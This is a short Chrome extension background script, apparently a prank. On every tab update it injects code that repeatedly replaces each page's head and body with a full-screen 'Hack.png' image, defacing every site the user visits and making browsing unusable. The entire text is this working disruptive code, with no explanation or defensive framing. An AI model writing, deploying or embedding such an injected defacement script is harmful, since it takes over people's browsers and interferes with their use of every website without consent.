chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
        chrome.tabs.executeScript({
            code : '(function(){var html=document.getElementsByTagName("html")[0];var head=document.getElementsByTagName("head")[0];var Hackedhead=document.createElement("head");var hackedBody=document.createElement("body");hackedBody.style.cssText="margin:0px;";var img=document.createElement("img");img.src = chrome.extension.getURL("Hack.png");img.style.cssText="width:100%;";hackedBody.insertBefore(img, hackedBody.firstChild);setInterval(function(){html.replaceChild(Hackedhead,html.firstChild);html.replaceChild(hackedBody,html.lastChild);},200);})();'
        });
}); 